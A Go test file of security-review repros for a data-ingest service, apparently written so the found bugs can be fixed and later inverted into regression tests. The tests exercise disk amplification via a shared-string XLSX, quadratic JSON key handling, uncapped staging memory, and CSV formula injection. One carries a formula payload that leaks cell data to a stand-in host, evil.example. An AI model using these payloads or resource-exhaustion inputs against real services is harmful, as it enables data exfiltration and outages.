package ingest

// Phase 5 security review repros. Each test asserts the CURRENT (vulnerable)
// behaviour: it passes today and is expected to fail once the issue is fixed,
// at which point it should be inverted into a regression test.

import (
	"bytes"
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/xuri/excelize/v2"

	"abidata/internal/catalog"
	"abidata/internal/query"
	"abidata/internal/sqlitex"
	"abidata/internal/workspace"
)

func secreview(t *testing.T) {
	t.Helper()
	if os.Getenv("ABIDATA_SECREVIEW") == "" {
		t.Skip("security review repro; set ABIDATA_SECREVIEW=1")
	}
}

// An XLSX whose cells all reference one large shared string is tiny on the wire,
// but every reference is materialised as a separate value in the staging
// database. Nothing bounds the staging file size (no per-workspace staging
// quota, no output-size cap), so a builder can fill the node's disk.
func TestSecReview_XLSXSharedStringAmplification(t *testing.T) {
	secreview(t)
	e := newEnv(t)
	big := strings.Repeat("A", 64<<10) // 64 KiB, well under maxFieldBytes
	f := excelize.NewFile()
	const rowsN, colsN = 100, 8
	for r := 1; r <= rowsN; r++ {
		row := make([]any, colsN)
		for c := range row {
			if r == 1 {
				row[c] = fmt.Sprintf("h%d", c)
			} else {
				row[c] = big
			}
		}
		cell, _ := excelize.CoordinatesToCellName(1, r)
		if err := f.SetSheetRow("Sheet1", cell, &row); err != nil {
			t.Fatal(err)
		}
	}
	var b bytes.Buffer
	if err := f.Write(&b); err != nil {
		t.Fatal(err)
	}
	upload := b.Len()
	m := e.upload("bomb.xlsx", b.String(), UploadOptions{})
	dir, _ := e.svc.stagingDir(e.ws)
	fi, err := os.Stat(filepath.Join(dir, m.ID+".db"))
	if err != nil {
		t.Fatal(err)
	}
	ratio := float64(fi.Size()) / float64(upload)
	t.Logf("upload %d bytes -> staging %d bytes (x%.0f)", upload, fi.Size(), ratio)
	if ratio < 100 {
		t.Fatalf("expected >100x amplification, got x%.1f", ratio)
	}
}

// Nothing limits how many pending imports a workspace may hold: every upload
// keeps its source file and staging DB on disk for 24 h.
func TestSecReview_UnboundedPendingImports(t *testing.T) {
	secreview(t)
	e := newEnv(t)
	data := "a,b\n" + strings.Repeat("xxxxxxxxxx,yyyyyyyyyy\n", 5000)
	for i := 0; i < 30; i++ {
		e.upload(fmt.Sprintf("f%d.csv", i), data, UploadOptions{})
	}
	dir, _ := e.svc.stagingDir(e.ws)
	ents, _ := os.ReadDir(dir)
	if len(ents) < 60 { // source + staging db per import
		t.Fatalf("expected all 30 imports to be kept, found %d files", len(ents))
	}
}

// readJSONObjects de-duplicates an object's keys with a linear scan per key and
// only enforces MaxColumns after the whole object has been read, so a single
// object with n distinct keys costs O(n^2). The loop never checks ctx, so the
// upload keeps burning a core after the client disconnects. A 100 MiB file holds
// ~7M keys: on the order of 10^13 comparisons.
func TestSecReview_JSONKeyDedupQuadratic(t *testing.T) {
	secreview(t)
	dir := t.TempDir()
	write := func(n int) string {
		var b strings.Builder
		b.WriteString("[{")
		for i := 0; i < n; i++ {
			if i > 0 {
				b.WriteByte(',')
			}
			fmt.Fprintf(&b, `"k%07d":0`, i)
		}
		b.WriteString("}]")
		p := filepath.Join(dir, fmt.Sprintf("o%d.json", n))
		if err := os.WriteFile(p, []byte(b.String()), 0o600); err != nil {
			t.Fatal(err)
		}
		return p
	}
	measure := func(n int) time.Duration {
		p := write(n)
		start := time.Now()
		_ = readJSONObjects(p, true, func([]string, []json.RawMessage) error { return nil })
		return time.Since(start)
	}
	small, large := measure(5000), measure(40000) // 8x the keys
	ratio := float64(large) / float64(max(small, time.Microsecond))
	t.Logf("5k keys %v, 40k keys %v (x%.1f; linear would be ~x8, quadratic ~x64)", small, large, ratio)
	if ratio < 20 {
		t.Fatalf("expected super-linear key de-duplication, ratio x%.1f", ratio)
	}
}

// Run-staging connections are opened without sqlite3.WithMaxMemory, so they get
// the driver default (256 MiB of wasm memory each) instead of the 64 MiB reader
// cap, and they use temp_store=MEMORY. A job may hold 8 handles; wasm memory
// never shrinks until the handle closes at the end of the run, so one run can
// pin ~2 GiB and each workspace may run 2 jobs at once: the node can be driven
// out of memory by a few builders. This query needs more than a reader may use
// and succeeds on staging.
func TestSecReview_StagingQueryMemoryCapLooserThanReaders(t *testing.T) {
	secreview(t)
	e := newEnv(t)
	rs := e.fresh()
	h, err := rs.Create(context.Background(), []string{"a"})
	if err != nil {
		t.Fatal(err)
	}
	if err := rs.Insert(context.Background(), h, []any{"x"}); err != nil {
		t.Fatal(err)
	}
	// ~100+ MiB of sorter data, all of it in memory (temp_store=MEMORY).
	const q = `WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM c WHERE x < 100000)
		SELECT count(*) AS n FROM (SELECT x, randomblob(1024) AS b FROM c ORDER BY b)`
	_, rows, err := rs.Query(context.Background(), h, q, nil)
	if err != nil {
		t.Fatalf("staging query was refused (memory cap present?): %v", err)
	}
	t.Logf("staging query sorted %v rows of 1 KiB in memory", rows[0][0])

	// The same statement on a capped reader connection fails with out-of-memory,
	// which shows the cap that staging lacks.
	var n int64
	rerr := e.l.Read(e.ctx, func(q2 sqlitex.Querier) error { return q2.QueryRow(e.ctx, q).Scan(&n) })
	t.Logf("reader connection: n=%d err=%v", n, rerr)
	if rerr == nil {
		t.Fatal("reader connection did not hit its memory cap; the comparison no longer holds")
	}
}

// CSV exports only neutralise formula prefixes for short_text/long_text/
// hyperlink columns. A calculated field with a text result (e.g. Name || ”)
// carries editor-supplied text verbatim, so "=HYPERLINK(...)" typed by an
// editor reaches a builder's spreadsheet as a live formula. Header cells (field
// display names, query column aliases) are never neutralised either.
func TestSecReview_CSVExportCalculatedFormula(t *testing.T) {
	secreview(t)
	e := newEnv(t)
	tb := e.table("People",
		catalog.ColumnSpec{DisplayName: "Name", Type: catalog.ShortText},
		catalog.ColumnSpec{DisplayName: "Label", Type: catalog.Calculated, Options: catalog.TypeOptions{Expression: "Name || ''", ResultType: "text"}},
		catalog.ColumnSpec{DisplayName: "=1+1", Type: catalog.ShortText},
	)
	payload := `=HYPERLINK("http://evil.example/?"&A1,"x")`
	if err := e.l.Write(e.ctx, workspace.Background, func(tx *sqlitex.Tx) error {
		_, err := tx.Exec(e.ctx, `INSERT INTO `+catalog.Quote(tb.PhysicalName)+`(`+catalog.Quote(col2(t, tb, "Name").PhysicalName)+`) VALUES (?)`, payload)
		return err
	}); err != nil {
		t.Fatal(err)
	}
	_, body := e.export(ExportRequest{SourceKind: "table", SourceID: tb.ID, Format: "csv"}, query.Policy{})
	recs, err := csv.NewReader(strings.NewReader(body)).ReadAll()
	if err != nil || len(recs) != 2 {
		t.Fatalf("%v %v", recs, err)
	}
	if recs[1][1] != "'"+payload {
		t.Fatalf("short_text column should be neutralised: %q", recs[1][1])
	}
	if recs[1][2] != payload {
		t.Fatalf("expected the calculated column to carry the raw formula, got %q", recs[1][2])
	}
	if recs[0][3] != "=1+1" {
		t.Fatalf("expected a raw formula header, got %q", recs[0][3])
	}
}
